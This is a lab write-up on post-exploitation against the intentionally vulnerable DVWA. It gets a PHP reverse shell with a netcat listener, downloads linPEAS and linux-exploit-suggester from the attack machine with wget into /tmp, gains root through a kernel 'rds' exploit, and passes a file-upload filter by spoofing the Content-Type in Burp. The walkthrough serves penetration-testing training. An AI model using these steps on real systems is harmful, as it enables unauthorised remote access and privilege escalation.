# Post Exploitation and Privilege Escalation

## Low security

### Reverse Shell in DVWA

* Find a reverse shell to use

Since the DVWA is written in PHP, we will have to use a PHP based reverse shell. The first result after a Google search [is the pentestingmonkey revrse shell](https://github.com/pentestmonkey/php-reverse-shell).

We will need to clone the repo:
![Screenshot 2022-03-10 164630](https://user-images.githubusercontent.com/19424915/157690757-aef2721f-d59c-472a-a9e0-e4defd4cd045.png)

* Adjust the Reverse Shell to match our demands

We will first need to find out the attack machine (Kali) IP address:
![Screenshot 2022-03-10 165807](https://user-images.githubusercontent.com/19424915/157691425-980327f4-cce9-4bd3-b674-0f64511ece2f.png)

Then, we can edit the revese shell code with our IP address and the port we will be listening to:
![Screenshot 2022-03-10 171526](https://user-images.githubusercontent.com/19424915/157692165-ca94d8d0-1a7c-4b69-8af7-3c3e25ed6d3b.png)

* Acheive Reverse Shell

We need to start a netcat instace on our attack machine which is going to listent to the port we have already specified in the Reverse Shell code - in our case "12345".
![Screenshot 2022-03-10 172410](https://user-images.githubusercontent.com/19424915/157695024-a57e8bdf-d0b3-484f-8da1-2f4cf17ffc84.png)

Once we have a listener up and ready we can upload and start the Reverse Shell.
![Screenshot 2022-03-10 172219](https://user-images.githubusercontent.com/19424915/157695200-99dd92b1-26fc-4fe6-8bb5-3cbc7a66a602.png)
![Screenshot 2022-03-10 172443](https://user-images.githubusercontent.com/19424915/157695224-d5e75372-c7a0-4c0a-8eaa-8927eb50b030.png)

As a result, we acheive remote access to the atacked machine (DVWA) terminal.
![Screenshot 2022-03-10 172505](https://user-images.githubusercontent.com/19424915/157695658-6ac33e32-d544-488f-a1d2-327bb03c730c.png)

### Find out DVWA vulnerabilities

* Get linPEAS

We will need a tool which will be responsible for giving us a vulnarability report for DVWA. We can user linPEAS to tackle this chellenge.
![Screenshot 2022-03-10 174233](https://user-images.githubusercontent.com/19424915/157699350-26f92e17-573d-415b-8e8c-ffe975460e9c.png)
![Screenshot 2022-03-10 174458](https://user-images.githubusercontent.com/19424915/157699369-7c765eb6-ff8f-43f8-a7ca-4941616a01cf.png)

* Upload linPEAS on DVWA

Now, we will have to somehow upload the linpeas script on our attacked machine. We can acheive this by serving the directory with the desired script file and than we can download it from the DVWA reverse shell.

For serving the linPEAS directory we can use a simple python http server.
![Screenshot 2022-03-10 220737](https://user-images.githubusercontent.com/19424915/157745874-676200e1-8acd-4b30-ace2-6ac6cd45c9d0.png)

Using the reverse shell we can download the `linpeas.sh` file from our http server. In our case, since the server listens on port `3000`, we will have to run `wget 10.0.2.15:3000/linpeas.sh`. If we try to simply run the command, we will receive a `permission denied` error, which obviously means that our user (`nobody`) cannot write in the current directory. So, we will need to find a directory where we can have write privileges. The most common linux directory with such description is the `/tmp` directory. It is used for files that are temporarily required by the system (Linux based). Which mean that most probably this directory will allow us to write in it. We can verify that by running `ls -la` which will list us the directories and their permissions.

![Screenshot 2022-03-11 002352](https://user-images.githubusercontent.com/19424915/157764788-cee07e81-3e0d-49bb-8d60-3e0126a60a58.png)

Since we have found a place to write, we can step further and download the script in the `/tmp` dir.

![Screenshot 2022-03-10 183107](https://user-images.githubusercontent.com/19424915/157765177-69091530-cb95-40c3-bc9f-70bd5e29a81a.png)

We have the script we need, we can go and just run it with `./linpeas.sh`. However, we again hit a `permission denied` error. Running `ls -la` we can observe that the only privileges we have are `w` (write) and `r` (read), but we have no `x` (execute). So, we must add it - `chmod +x linpeas.sh`.

![Screenshot 2022-03-10 215055](https://user-images.githubusercontent.com/19424915/157766026-9cf5cda3-2fdc-4822-9dd3-84b04d5671aa.png)
 
 Finally, we can run the script and analyze the result. The report is Ðµxhaustive and contains almost everything we need to know about the attacked machine.
 
 ![Screenshot 2022-03-10 215400](https://user-images.githubusercontent.com/19424915/157766375-a3d6b611-7e51-4b95-b330-b191ca8ecac8.png)

### Most probable exploits

In order to find out the most probable exploits, we can use a great tool called [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester). 

We can use the same approach as we used for the linPEAS script. We will need to:

1. Clone the repo from github;

![Screenshot 2022-03-11 160025](https://user-images.githubusercontent.com/19424915/157884600-c7d9bff5-c0d0-4a5b-900b-582760b2bf5b.png)
![Screenshot 2022-03-11 160141](https://user-images.githubusercontent.com/19424915/157884636-b0050c83-8129-48b7-913f-295538a3514e.png)

2. Serve the directory with the file we need;

![Screenshot 2022-03-11 160510](https://user-images.githubusercontent.com/19424915/157884821-14da417f-e26a-402b-9372-3eb7cbd82d70.png)

3. Download the script in the `/tmp` dir of the DVWA and make sure that we have the correct privileges to execute the file;

![Screenshot 2022-03-11 160728](https://user-images.githubusercontent.com/19424915/157885169-4ccb5522-542c-4192-9f6e-1bf5814bc457.png)

Finally, we can run the `linux-exploit-suggester.sh` script and analyze the results.

![Screenshot 2022-03-11 160912](https://user-images.githubusercontent.com/19424915/157885590-ef4f5d04-bd5b-4708-a72e-ce0e26997a9a.png)

As we can observe there are three `highly probable` exploits: `dirtycow 2`, `rds` and `can_bcm`.

### Escalate Privilege

Now, we can try to exploit and escalate our privilige on the attcked machine. We will try it by using `rds` exploit.

There are number of github repos containing different kernel exploits. We will be using [kernel-exploits](https://github.com/lucyoa/kernel-exploits). There is a `rds` executable file which could be direcly downloaded.

![Screenshot 2022-03-11 234036](https://user-images.githubusercontent.com/19424915/157975721-cfcb7ec1-7e2e-4d96-981d-052e610fcbd4.png)

We will have to simply transfer the file on the attcked machine and run it.

![Screenshot 2022-03-11 235647](https://user-images.githubusercontent.com/19424915/157975959-d3ef0b97-7950-49be-b4aa-66912e618e6c.png)

![Screenshot 2022-03-11 164128](https://user-images.githubusercontent.com/19424915/157975980-e8e1c30e-50b1-4318-a804-88ba60086da1.png)

![Screenshot 2022-03-11 164252](https://user-images.githubusercontent.com/19424915/157975994-72563ef5-c813-4dc3-b104-3ab797510939.png)

Great news! We have gained `root` user access to the attacked machine.

## Medium security

### Reverse Shell in DVWA

We will use the same approach as we used for the low security case. We will need to somehow upload a reverse shell script in order to gain a remote access to the attacked machine. However, since the security level is higher, we will need to find more innovative way to do that.

I have tried a couple of approaches to bypass the validation. First, tried to upload a normal `.jpg` file to verify the correct file type.

![Screenshot 2022-03-12 004004](https://user-images.githubusercontent.com/19424915/158017947-958faff9-00cc-481b-9754-2dd87bbc9bca.png)

Then I tried to: 
1. Upload a file with a couple of extensions - `php-reverse-shell.img.txt.php`; 
2. Upload a file with some capital letters in the extension - `php-reverse-shell.PHp`
3. Upload a file with `;` and `\` separators - `image.jpg;php-reverse-shell.php`, `image.jpg\php-reverse-shell.php`.

None of the above approaches was successful.

Finally, I attempted to override the `Content-Type` of the `POST` http request which is resposible for uploading the file. To acheive that I had to use `Burp`.

First, I intersepted the `POST` request which uplaods the `php-reverse-shell.php` file.

![Screenshot 2022-03-12 023514](https://user-images.githubusercontent.com/19424915/158019691-e0ac683c-c657-408b-845f-fdbaef2ba8c5.png)

As we can observe, the `Content-Type` of the request body is `application/x-php`. I had to override it with `image/jpeg`. To acheive that, sent the intersepted request to the `repeater` and edited the `Content-Type` field.

![Screenshot 2022-03-12 023607](https://user-images.githubusercontent.com/19424915/158019809-d6d25cc9-7c89-4d01-acde-7aa2e413a9c9.png)

Making a request with the new `Content-Type` leads to a successful upload of the file to the server. Which means that the server validates only the `Content-Type` of the http request.

![Screenshot 2022-03-12 023637](https://user-images.githubusercontent.com/19424915/158019928-82c02d9b-6d4f-4caa-98d0-9ae6ff541307.png)

Now, we can navigate to the file and gain a remote access to the DVWA. Of course, we need to have a `netcat` listener running. 

![Screenshot 2022-03-12 023728](https://user-images.githubusercontent.com/19424915/158020050-baff31f0-db8d-438a-b62d-5a6f4e3dce69.png)

### Escalate Privilege

**Note: all the steps bellow are identical with those for the low security case, so will not be explained in details.**

Now, we can try to gain `root` user privileges. We will do the same steps as we did for the `low security` case.

First, we will upload `linux-exploit-suggester.sh` by serving it from our machine and downloading it from the attacked machine.

![Screenshot 2022-03-12 165735](https://user-images.githubusercontent.com/19424915/158027778-871b618f-8543-422f-85e0-c0a81307e671.png)

![Screenshot 2022-03-12 165759](https://user-images.githubusercontent.com/19424915/158027790-f69859e1-6d9d-4926-a2c0-3a49679848e5.png)

Then, we can execute the script.

![Screenshot 2022-03-12 165937](https://user-images.githubusercontent.com/19424915/158027822-3a7a20d5-13f4-4dcd-b85e-ad6a750fefde.png)

![Screenshot 2022-03-12 170027](https://user-images.githubusercontent.com/19424915/158027832-8a0ef4b8-08de-489d-94bc-8255c95377fe.png)

As we did for the low securty, we will use `rds` exploit.

We will transfer it to the attcked machine.

![Screenshot 2022-03-12 170124](https://user-images.githubusercontent.com/19424915/158028618-96556adb-539f-47ae-a609-c06ace48573c.png)
![Screenshot 2022-03-12 170202](https://user-images.githubusercontent.com/19424915/158028629-7a18ccb6-3101-436b-9aad-2ef70a33c0a8.png)

And execute it.

![Screenshot 2022-03-12 170252](https://user-images.githubusercontent.com/19424915/158028648-f16627bd-581c-4ff2-921d-8958183de62c.png)

![Screenshot 2022-03-12 170323](https://user-images.githubusercontent.com/19424915/158028652-a1820593-7de0-4555-8160-9bca0c7ecbce.png)
